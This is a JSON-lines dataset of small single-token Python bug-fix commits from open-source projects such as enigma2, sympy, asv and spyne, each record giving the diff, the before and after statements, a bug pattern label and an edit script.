{"project": "enigma2", "commit_sha": "b054e19ba2f1cfd5892743fa9737addb6725fafc", "parent_sha": "b858addf48389ebb90fee469ec220f97d582d5e6", "file_path": "lib/python/Screens/ScanSetup.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -317,7 +317,7 @@ class ScanSetup(Screen):\n \t\t\tconfig.scan.sat.inversion = configElement_nonSave(\"config.scan.sat.inversion\", configSelection, 2, ((\"off\", _(\"off\")), (\"on\", _(\"on\")), _(\"Auto\")))\n \t\t\tconfig.scan.sat.symbolrate = configElement_nonSave(\"config.scan.sat.symbolrate\", configSequence, [27500], configsequencearg.get(\"INTEGER\", (1, 99999)))\n \t\t\tconfig.scan.sat.polarization = configElement_nonSave(\"config.scan.sat.polarization\", configSelection, 0, ((\"horizontal\", _(\"horizontal\")), (\"vertical\", _(\"vertical\")),  (\"circular_left\", _(\"circular left\")), (\"circular_right\", _(\"circular right\"))))\n-\t\t\tconfig.scan.sat.fec = configElement_nonSave(\"config.scan.sat.fec\", configSelection, 7, ((\"auto\", _(\"Auto\")), (\"1_2\", \"1/2\"), (\"2_3\", \"2/3\"), (\"3_4\", \"3/4\"), (\"5_6\", \"5/6\"), (\"7_8\", \"7/8\"), (\"none\", _(\"None\"))))\n+\t\t\tconfig.scan.sat.fec = configElement_nonSave(\"config.scan.sat.fec\", configSelection, 0, ((\"auto\", _(\"Auto\")), (\"1_2\", \"1/2\"), (\"2_3\", \"2/3\"), (\"3_4\", \"3/4\"), (\"5_6\", \"5/6\"), (\"7_8\", \"7/8\"), (\"none\", _(\"None\"))))\n \t\t\tconfig.scan.sat.fec_s2 = configElement_nonSave(\"config.scan.sat.fec_s2\", configSelection, 8, ((\"1_2\", \"1/2\"), (\"2_3\", \"2/3\"), (\"3_4\", \"3/4\"), (\"3_5\", \"3/5\"), (\"4_5\", \"4/5\"), (\"5_6\", \"5/6\"), (\"7_8\", \"7/8\"), (\"8_9\", \"8/9\"), (\"9_10\", \"9/10\")))\n \t\t\tconfig.scan.sat.modulation = configElement_nonSave(\"config.scan.sat.modulation\", configSelection, 0, ((\"qpsk\", \"QPSK\"), (\"8psk\", \"8PSK\")))\n \t\n", "before": "config . scan . sat . fec = configElement_nonSave ( \"config.scan.sat.fec\" , configSelection , 7 , ( ( \"auto\" , _ ( \"Auto\" ) ) , ( \"1_2\" , \"1/2\" ) , ( \"2_3\" , \"2/3\" ) , ( \"3_4\" , \"3/4\" ) , ( \"5_6\" , \"5/6\" ) , ( \"7_8\" , \"7/8\" ) , ( \"none\" , _ ( \"None\" ) ) ) )", "after": "config . scan . sat . fec = configElement_nonSave ( \"config.scan.sat.fec\" , configSelection , 0 , ( ( \"auto\" , _ ( \"Auto\" ) ) , ( \"1_2\" , \"1/2\" ) , ( \"2_3\" , \"2/3\" ) , ( \"3_4\" , \"3/4\" ) , ( \"5_6\" , \"5/6\" ) , ( \"7_8\" , \"7/8\" ) , ( \"none\" , _ ( \"None\" ) ) ) )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:7\", 3, 88, 3, 89], \"0\"]]"}
{"project": "sympy", "commit_sha": "2351bab0a49ccbe8e5d8941861aaf2d07ded25b4", "parent_sha": "d0e9fac55cdebaabe6f3f24d676a1b03f3f74b40", "file_path": "sympy/core/expr.py", "project_url": "https://github.com/sampadsaha5/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -190,7 +190,7 @@ def __int__(self):\n         # off by one. So...if our round value is the same as the int value\n         # (regardless of how much extra work we do to calculate extra decimal\n         # places) we need to test whether we are off by one.\n-        r = self.round(1)\n+        r = self.round(2)\n         if not r.is_Number:\n             raise TypeError(\"can't convert complex to int\")\n         i = int(r)\n", "before": "r = self . round ( 1 )", "after": "r = self . round ( 2 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 24, 3, 25], \"2\"]]"}
{"project": "onnx-chainer", "commit_sha": "c9fed4cb61df732b0ad800c00a0eca492da5a7e4", "parent_sha": "4a2624e481d30366285fb4970351ff70c640e9ea", "file_path": "tests/test_export_testcase.py", "project_url": "https://github.com/chainer/onnx-chainer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def model():\n \n @pytest.fixture(scope='function')\n def x():\n-    return np.zeros((1, 3, 28, 28), dtype=np.float32)\n+    return np.zeros((10, 3, 28, 28), dtype=np.float32)\n \n \n @pytest.mark.parametrize('in_names,out_names',\n", "before": "return np . zeros ( ( 1 , 3 , 28 , 28 ) , dtype = np . float32 )", "after": "return np . zeros ( ( 10 , 3 , 28 , 28 ) , dtype = np . float32 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1\", 3, 22, 3, 23], \"10\"]]"}
{"project": "enigma2", "commit_sha": "8eb6e2d2bb79df03ce1f4ee1abbb63dfefe45048", "parent_sha": "77dae0613d018251ad971a0b289936e95459eefc", "file_path": "lib/python/Screens/ChoiceBox.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class ChoiceBox(Screen):\n \t\tself.list = []\n \t\tself.summarylist = []\n \t\tif keys is None:\n-\t\t\tself.__keys = [ \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"0\", \"red\", \"green\", \"yellow\", \"blue\" ] + (len(list) - 10) * [\"\"]\n+\t\t\tself.__keys = [ \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"0\", \"red\", \"green\", \"yellow\", \"blue\" ] + (len(list) - 14) * [\"\"]\n \t\telse:\n \t\t\tself.__keys = keys + (len(list) - len(keys)) * [\"\"]\n \n", "before": "self . __keys = [ \"1\" , \"2\" , \"3\" , \"4\" , \"5\" , \"6\" , \"7\" , \"8\" , \"9\" , \"0\" , \"red\" , \"green\" , \"yellow\" , \"blue\" ] + ( len ( list ) - 10 ) * [ \"\" ]", "after": "self . __keys = [ \"1\" , \"2\" , \"3\" , \"4\" , \"5\" , \"6\" , \"7\" , \"8\" , \"9\" , \"0\" , \"red\" , \"green\" , \"yellow\" , \"blue\" ] + ( len ( list ) - 14 ) * [ \"\" ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:10\", 3, 120, 3, 122], \"14\"]]"}
{"project": "ssh-audit", "commit_sha": "182467e0e8463fe87e9e9453f5327a607226578a", "parent_sha": "385c2303765c0a1ae20c70d1700e5887aea07772", "file_path": "ssh-audit.py", "project_url": "https://github.com/jtesta/ssh-audit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1648,7 +1648,7 @@ def output_security_sub(sub, software, padlen):\n \t\tvfrom, vtill = line[0:2]  # type: str, str\n \t\tif not software.between_versions(vfrom, vtill):\n \t\t\tcontinue\n-\t\ttarget, name = line[2:3]  # type: int, str\n+\t\ttarget, name = line[2:4]  # type: int, str\n \t\tis_server, is_client = target & 1 == 1, target & 2 == 2\n \t\tis_local = target & 4 == 4\n \t\tif not is_server:\n", "before": "target , name = line [ 2 : 3 ]", "after": "target , name = line [ 2 : 4 ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 25, 3, 26], \"4\"]]"}
{"project": "OoT-Randomizer", "commit_sha": "c038b69876dd790b5ab0d1b1b5c415ce5bf37075", "parent_sha": "0996f34b1a2509a8f318afe5943fe6a1192d12fe", "file_path": "Cosmetics.py", "project_url": "https://github.com/TestRunnerSRL/OoT-Randomizer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -209,7 +209,7 @@ def patch_sword_trails(rom, settings, log, symbols):\n         ('Inner Initial Sword Trail', settings.sword_trail_color_inner, \n             [(0x00BEFF80, 0xB0, 0x40), (0x00BEFF88, 0x20, 0x00)], symbols['CFG_RAINBOW_SWORD_INNER_ENABLED']),\n         ('Outer Initial Sword Trail', settings.sword_trail_color_outer, \n-            [(0x00BEFF7C, 0xB0, 0xF0), (0x00BEFF84, 0x10, 0x00)], symbols['CFG_RAINBOW_SWORD_OUTER_ENABLED']),\n+            [(0x00BEFF7C, 0xB0, 0xFF), (0x00BEFF84, 0x10, 0x00)], symbols['CFG_RAINBOW_SWORD_OUTER_ENABLED']),\n     ]\n \n     sword_color_list = get_sword_colors()\n", "before": "( 'Outer Initial Sword Trail' , settings . sword_trail_color_outer , [ ( 0x00BEFF7C , 0xB0 , 0xF0 ) , ( 0x00BEFF84 , 0x10 , 0x00 ) ] , symbols [ 'CFG_RAINBOW_SWORD_OUTER_ENABLED' ] ) ,", "after": "( 'Outer Initial Sword Trail' , settings . sword_trail_color_outer , [ ( 0x00BEFF7C , 0xB0 , 0xFF ) , ( 0x00BEFF84 , 0x10 , 0x00 ) ] , symbols [ 'CFG_RAINBOW_SWORD_OUTER_ENABLED' ] ) ,", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0xF0\", 3, 33, 3, 37], \"0xFF\"]]"}
{"project": "OoT-Randomizer", "commit_sha": "cbdd1a1a3769a51add7a42fbe57b5613a945bfb8", "parent_sha": "e790deab6236c5f42abd42b8b7d5bd311690f76a", "file_path": "Plandomizer.py", "project_url": "https://github.com/TestRunnerSRL/OoT-Randomizer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -869,7 +869,7 @@ class Distribution(object):\n                 num_hearts_to_collect -= 1\n             for i in range(0, num_hearts_to_collect, 2):\n                 data['Piece of Heart'] += 4\n-                data['Heart Container'] += 4\n+                data['Heart Container'] += 1\n \n         for world in self.world_dists:\n             world.update({'starting_items': data})\n", "before": "data [ 'Heart Container' ] += 4", "after": "data [ 'Heart Container' ] += 1", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:4\", 3, 44, 3, 45], \"1\"]]"}
{"project": "scenario_runner", "commit_sha": "f6f5480a4c491d287b073da8fbf557b054c69cda", "parent_sha": "69b512693e614db11a1702f5463d392bcd7c01f6", "file_path": "srunner/scenarios/config_parser.py", "project_url": "https://github.com/carla-simulator/scenario_runner", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -134,6 +134,6 @@ def find_scenario_config(scenario_name):\n         tree = ET.parse(file_name)\n         for scenario in tree.iter(\"scenario\"):\n             if set_attrib(scenario, 'name', None) == scenario_name:\n-                return file_name[8:-4]\n+                return file_name[16:-4]\n \n     return None\n", "before": "return file_name [ 8 : - 4 ]", "after": "return file_name [ 16 : - 4 ]", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:8\", 3, 34, 3, 35], \"16\"]]"}
{"project": "radical.saga", "commit_sha": "e214c0221ab67f56afe6ba715b52aa7bf8afcb40", "parent_sha": "e48fe53824b6a0969d5f64fddd628d59fc9671d1", "file_path": "tests/run_tests.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ def launch_tests(options, testdir):\n             # configure the unit test framework\n             config = nose.config.Config()\n \n-            config.verbosity  = 3\n+            config.verbosity  = 10\n             config.workingDir = testdir + '/' + test_suite\n             config.stream     = sys.stderr\n \n", "before": "config . verbosity = 3", "after": "config . verbosity = 10", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 33, 3, 34], \"10\"]]"}
{"project": "fuel-devops", "commit_sha": "3232db37269981075586d745fb90ea915c433902", "parent_sha": "7b6cd39c98c921ce6a5ff3450ef3971bbe5e7785", "file_path": "src/devops/manager.py", "project_url": "https://github.com/openstack/fuel-devops", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ class Manager(object):\n             has_pxe_server=has_pxe_server, has_dhcp_server=has_dhcp_server,\n             forward=forward)\n \n-    def node_create(self, name, environment=None, role=None, vcpu=2,\n+    def node_create(self, name, environment=None, role=None, vcpu=1,\n                     memory=1024, has_vnc=True, metadata=None, hypervisor='kvm',\n                     os_type='hvm', architecture='x86_64', boot=None):\n", "before": "def node_create ( self , name , environment = None , role = None , vcpu = 2 , memory = 1024 , has_vnc = True , metadata = None , hypervisor = 'kvm' , os_type = 'hvm' , architecture = 'x86_64' , boot = None ) : ", "after": "def node_create ( self , name , environment = None , role = None , vcpu = 1 , memory = 1024 , has_vnc = True , metadata = None , hypervisor = 'kvm' , os_type = 'hvm' , architecture = 'x86_64' , boot = None ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 67, 3, 68], \"1\"]]"}
{"project": "radical.saga", "commit_sha": "65ad815011b1546b4ac1f27feb1d8b2285e1950f", "parent_sha": "f223894f8766fcb16664693f84de37c4957213d3", "file_path": "saga/utils/timeout_gc.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class TimeoutGC (object) :\n     # --------------------------------------------------------------------------\n     #\n     #\n-    def register (self, obj, obj_initialize, obj_finalize, timeout=60) :\n+    def register (self, obj, obj_initialize, obj_finalize, timeout=600) :\n", "before": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 60 ) : ", "after": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 600 ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:60\", 3, 68, 3, 70], \"600\"]]"}
{"project": "radical.saga", "commit_sha": "4e402ef40b574d7a62c9cd155830e85178a8e618", "parent_sha": "0067969f6b5c95080f84cff69b10ece38e8b2cdd", "file_path": "saga/utils/timeout_gc.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class TimeoutGC (object) :\n     # --------------------------------------------------------------------------\n     #\n     #\n-    def register (self, obj, obj_initialize, obj_finalize, timeout=60) :\n+    def register (self, obj, obj_initialize, obj_finalize, timeout=600) :\n", "before": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 60 ) : ", "after": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 600 ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:60\", 3, 68, 3, 70], \"600\"]]"}
{"project": "radical.saga", "commit_sha": "0899af6f8db2a44c10a1ace53874126537ec6dc9", "parent_sha": "65ad815011b1546b4ac1f27feb1d8b2285e1950f", "file_path": "saga/utils/timeout_gc.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class TimeoutGC (object) :\n     # --------------------------------------------------------------------------\n     #\n     #\n-    def register (self, obj, obj_initialize, obj_finalize, timeout=600) :\n+    def register (self, obj, obj_initialize, obj_finalize, timeout=99999) :\n", "before": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 600 ) : ", "after": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 99999 ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:600\", 3, 68, 3, 71], \"99999\"]]"}
{"project": "radical.saga", "commit_sha": "86d1927c7f549990c27f61d1d4d8050f0913aad1", "parent_sha": "4e402ef40b574d7a62c9cd155830e85178a8e618", "file_path": "saga/utils/timeout_gc.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class TimeoutGC (object) :\n     # --------------------------------------------------------------------------\n     #\n     #\n-    def register (self, obj, obj_initialize, obj_finalize, timeout=600) :\n+    def register (self, obj, obj_initialize, obj_finalize, timeout=99999) :\n", "before": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 600 ) : ", "after": "def register ( self , obj , obj_initialize , obj_finalize , timeout = 99999 ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:600\", 3, 68, 3, 71], \"99999\"]]"}
{"project": "scout", "commit_sha": "52ca1cc050d24320d09bb92b9fc506f49ace2dfe", "parent_sha": "4a57d06db8a711cafece76f4132b0708201dcb5b", "file_path": "scout/commands/case.py", "project_url": "https://github.com/Clinical-Genomics/scout", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def case(context, vcf, vcf_sv, owner, ped, update, config):\n     config_data['vcf_snv'] = vcf if vcf else config_data.get('vcf_snv')\n     config_data['vcf_sv'] = vcf_sv if vcf_sv else config_data.get('vcf_sv')\n     config_data['owner'] = owner if owner else config_data.get('owner')\n-    config_data['rank_threshold'] = config_data.get('rank_threshold') or 8\n+    config_data['rank_threshold'] = config_data.get('rank_threshold') or 5\n \n     if not (config_data.get('vcf_snv') or config_data.get('vcf_sv')):\n         logger.warn(\"Please provide a vcf file (use '--vcf')\")\n", "before": "config_data [ 'rank_threshold' ] = config_data . get ( 'rank_threshold' ) or 8", "after": "config_data [ 'rank_threshold' ] = config_data . get ( 'rank_threshold' ) or 5", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:8\", 3, 74, 3, 75], \"5\"]]"}
{"project": "alignak", "commit_sha": "c8acfb110599b6c23a2e724ac569f34303f69077", "parent_sha": "da9f23bfcaee0d5312e336b2dfcd2139abd98940", "file_path": "test/test_acknowledge.py", "project_url": "https://github.com/Alignak-monitoring/alignak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -310,7 +310,7 @@ class TestConfig(ShinkenTest):\n         self.assert_(self.log_match(1, 'SERVICE ALERT.*WARNING'))\n         self.assert_(self.log_match(2, 'SERVICE NOTIFICATION'))\n         self.assert_(self.log_match(3, 'SERVICE NOTIFICATION'))\n-        self.assert_(self.count_logs() == 2)\n+        self.assert_(self.count_logs() == 3)\n         self.assert_(self.count_actions() == 2) # master sched, contact zombie\n         self.assert_(svc.current_notification_number == 4)\n         self.show_and_clear_logs()\n", "before": "self . assert_ ( self . count_logs ( ) == 2 )", "after": "self . assert_ ( self . count_logs ( ) == 3 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2\", 3, 43, 3, 44], \"3\"]]"}
{"project": "oftest", "commit_sha": "34c678b58bfcb4f79d76592a6c77459ffa2ce4dd", "parent_sha": "b580c0d710ccce0c940320c6b17b82fc9b0a17d5", "file_path": "tests-1.3/basic.py", "project_url": "https://github.com/floodlight/oftest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -560,6 +560,6 @@ class AsyncConfigGet(base_tests.SimpleProtocol):\n         response, _ = self.controller.transact(ofp.message.async_get_request())\n         self.assertTrue(response != None, \"No response to get async config request\")\n         logging.info(response.show())\n-        self.assertEquals(response.packet_in_mask_equal_master & 0x07, 0x07)\n+        self.assertEquals(response.packet_in_mask_equal_master & 0x07, 0x03)\n         self.assertEquals(response.port_status_mask_equal_master & 0x07, 0x07)\n         self.assertEquals(response.flow_removed_mask_equal_master & 0x0f, 0x0f)\n", "before": "self . assertEquals ( response . packet_in_mask_equal_master & 0x07 , 0x07 )", "after": "self . assertEquals ( response . packet_in_mask_equal_master & 0x07 , 0x03 )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:0x07\", 3, 72, 3, 76], \"0x03\"]]"}
{"project": "oftest", "commit_sha": "94895fd4960c02e986fb8122a0a1b7843fa4126e", "parent_sha": "562b0e30f7826c613c8d9aa9c1ae0f1750fa8f58", "file_path": "src/python/oftest/controller.py", "project_url": "https://github.com/floodlight/oftest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -295,7 +295,7 @@ class Controller(Thread):\n                         code_str = \"unknown\"\n                     self.logger.warn(\"Received error message: xid=%d type=%s (%d) code=%s (%d)\",\n                                      hdr_xid, type_str, msg.err_type, code_str, msg.code if code_str != \"unknown\" else -1)\n-                    if msg.version >= 3 and isinstance(msg, ofp.message.bsn_error):\n+                    if msg.version >= 4 and isinstance(msg, ofp.message.bsn_error):\n                         self.logger.warn(\"BSN error, msg '%s'\", msg.err_msg)\n \n                 # Now check for message handlers; preference is given to\n", "before": "if msg . version >= 3 and isinstance ( msg , ofp . message . bsn_error ) : self . logger . warn ( \"BSN error, msg '%s'\" , msg . err_msg )", "after": "if msg . version >= 4 and isinstance ( msg , ofp . message . bsn_error ) : self . logger . warn ( \"BSN error, msg '%s'\" , msg . err_msg )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:3\", 3, 39, 3, 40], \"4\"]]"}
{"project": "asv", "commit_sha": "83de1f754310bbaa576f7eaf570510fd3d8a3cb6", "parent_sha": "5d49d0f4d0e9554d52aedf15c0d636b69e11689d", "file_path": "asv/util.py", "project_url": "https://github.com/TomAugspurger/asv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ def check_call(args, error=True, timeout=60, dots=True, display_error=True,\n         display_error=display_error, shell=shell)\n \n \n-def check_output(args, error=True, timeout=60, dots=True, display_error=True,\n+def check_output(args, error=True, timeout=120, dots=True, display_error=True,\n                  shell=False):\n", "before": "def check_output ( args , error = True , timeout = 60 , dots = True , display_error = True , shell = False ) : ", "after": "def check_output ( args , error = True , timeout = 120 , dots = True , display_error = True , shell = False ) : ", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:60\", 3, 44, 3, 46], \"120\"]]"}
{"project": "asv", "commit_sha": "93d6daea881df4156f79b6b3363f22e389a0ce6a", "parent_sha": "0e8569b2be96f966b71afb41fbf7373ba5ba0df1", "file_path": "test/test_results.py", "project_url": "https://github.com/TomAugspurger/asv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -23,7 +23,7 @@ def test_results(tmpdir):\n              'arch': 'x86_64'},\n             {},\n             hex(i),\n-            i * 1000000l,\n+            i * 1000000,\n             '2.7')\n         for key, val in {\n             'suite1.benchmark1': float(i * 0.001),\n", "before": "i * 1000000l ,", "after": "i * 1000000 ,", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1000000l\", 3, 17, 3, 25], \"1000000\"]]"}
{"project": "asv", "commit_sha": "efbde6f275e9f4496d417a6b1f86e6a015322642", "parent_sha": "65ac5711a55fe40c4f427f7c985b977dc4bd47d4", "file_path": "test/test_benchmarks.py", "project_url": "https://github.com/TomAugspurger/asv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def test_find_benchmarks(tmpdir):\n     assert times[\n         'subdir.time_subdir.time_foo']['result'] is not None\n     assert times[\n-        'mem_examples.mem_list']['result'] > 2000\n+        'mem_examples.mem_list']['result'] > 1000\n     assert times[\n         'time_secondary.track_value']['result'] == 42.0\n     assert 'profile' in times[\n", "before": "assert times [ 'mem_examples.mem_list' ] [ 'result' ] > 2000", "after": "assert times [ 'mem_examples.mem_list' ] [ 'result' ] > 1000", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:2000\", 3, 46, 3, 50], \"1000\"]]"}
{"project": "spaCy", "commit_sha": "ebf8942564246729c79a299d597f13e8bd1215b2", "parent_sha": "8c945310fb16912a23ef8311cd4cd00aeb3798e2", "file_path": "spacy/tests/stringstore/test_stringstore.py", "project_url": "https://github.com/connorbrinton/spaCy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ def test_string_hash(stringstore):\n     heart = '\\U0001f499'\n     print(heart)\n     h = ss.add(heart)\n-    assert h == 11841826740069053588L\n+    assert h == 11841826740069053588\n  \n \n def test_stringstore_from_api_docs(stringstore):\n", "before": "assert h == 11841826740069053588L", "after": "assert h == 11841826740069053588", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:11841826740069053588L\", 3, 17, 3, 38], \"11841826740069053588\"]]"}
{"project": "blaze", "commit_sha": "5c68b6241a1a91ee57d324dd83b6fe50511f3bdf", "parent_sha": "f5c3699ec4bcd1dc91ab5a35fef7d94e5f8dd094", "file_path": "blaze/data/utils.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ def validate(schema, item):\n \n def coerce(dshape, item):\n     if isinstance(item, Iterator):\n-        blocks = partition_all(1000, item)\n+        blocks = partition_all(1024, item)\n         return chain.from_iterable(map(partial(coerce, dshape), blocks))\n     return nd.as_py(nd.array(item, dtype=str(dshape)), tuple=True)\n \n", "before": "blocks = partition_all ( 1000 , item )", "after": "blocks = partition_all ( 1024 , item )", "sstub_pattern": "CHANGE_NUMERIC_LITERAL", "edit_script": "[[\"Update\", [\"integer:1000\", 3, 32, 3, 36], \"1024\"]]"}
{"project": "spyne", "commit_sha": "e02402e65e5aa17237c2f7cc9e0bafb998d2660a", "parent_sha": "de8d489350a0811a50d5a11d7a3e3878393bdd3b", "file_path": "src/soaplib/serializers/enum.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class EnumBase(SimpleType):\n \n     @classmethod\n     @nillable_value\n-    def to_xml(cls, value, tns, name=None):\n+    def to_xml(cls, value, tns, name='retval'):\n         if name is None:\n             name = cls.get_type_name()\n \n", "before": "def to_xml ( cls , value , tns , name = None ) : if name is None : name = cls . get_type_name ( )", "after": "def to_xml ( cls , value , tns , name = 'retval' ) : if name is None : name = cls . get_type_name ( )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 33, 3, 42], [\"string:'retval'\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 38, 3, 42]]]"}
{"project": "spyne", "commit_sha": "691473158ab378a8a61dd40e6c4fc77470b17cb1", "parent_sha": "5690ea16c65fe12f284680619333c698f95fccbb", "file_path": "spyne/util/xml.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ def _dig(par):\n \n xml_object = XmlDocument()\n \n-def get_object_as_xml(inst, cls=None, root_tag_name=None, no_namespace=None):\n+def get_object_as_xml(inst, cls=None, root_tag_name=None, no_namespace=False):\n", "before": "def get_object_as_xml ( inst , cls = None , root_tag_name = None , no_namespace = None ) : ", "after": "def get_object_as_xml ( inst , cls = None , root_tag_name = None , no_namespace = False ) : ", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 59, 3, 76], [\"false:False\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 72, 3, 76]]]"}
{"project": "spyne", "commit_sha": "c79f2cdbdfa4eac3f3a9918553172160c23a42ab", "parent_sha": "3f103f67c560787621d90475cf855a921657db93", "file_path": "spyne/interface/wsdl/wsdl11.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -457,7 +457,7 @@ class Wsdl11(XmlSchema):\n                     in_header_message_name = in_headers[0].get_type_name()\n \n                 for header in in_headers:\n-                    soap_header = etree.SubElement(input, SOAP(header))\n+                    soap_header = etree.SubElement(input, SOAP('header'))\n                     soap_header.set('use', 'literal')\n                     soap_header.set('message', '%s:%s' % (\n                                 header.get_namespace_prefix(self.interface),\n", "before": "soap_header = etree . SubElement ( input , SOAP ( header ) )", "after": "soap_header = etree . SubElement ( input , SOAP ( 'header' ) )", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 63, 3, 71], [\"string:'header'\", \"T\"], 1], [\"Delete\", [\"identifier:header\", 3, 64, 3, 70]]]"}
{"project": "django-inplaceedit", "commit_sha": "db9e4728e29633e71b5d57d915f11eb7c3fe4fff", "parent_sha": "4a41056364faa4fb6fe99931426838419e439808", "file_path": "testing/testing/unit_tests/tests.py", "project_url": "https://github.com/codingsnippets/django-inplaceedit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ class InplaceTestCase(TestCase):\n                 elif isinstance(field, models.CommaSeparatedIntegerField):\n                     value += ',44'\n                 elif isinstance(field, models.EmailField):\n-                    value += 'xxx@es.com'\n+                    value = 'xxx@es.com'\n                 elif isinstance(field, models.ForeignKey):\n                     value = field.rel.to.objects.all()[0].pk\n                 elif isinstance(field, bool):\n", "before": "value += 'xxx@es.com'", "after": "value = 'xxx@es.com'", "sstub_pattern": "SINGLE_TOKEN", "edit_script": "[[\"Insert\", [\"expression_statement\", 3, 21, 3, 42], [\"assignment\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:value\", 3, 21, 3, 26], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Move\", \"N0\", [\"string:'xxx@es.com'\", 3, 30, 3, 42], 2], [\"Delete\", [\"+=:+=\", 3, 27, 3, 29]], [\"Delete\", [\"augmented_assignment\", 3, 21, 3, 42]]]"}
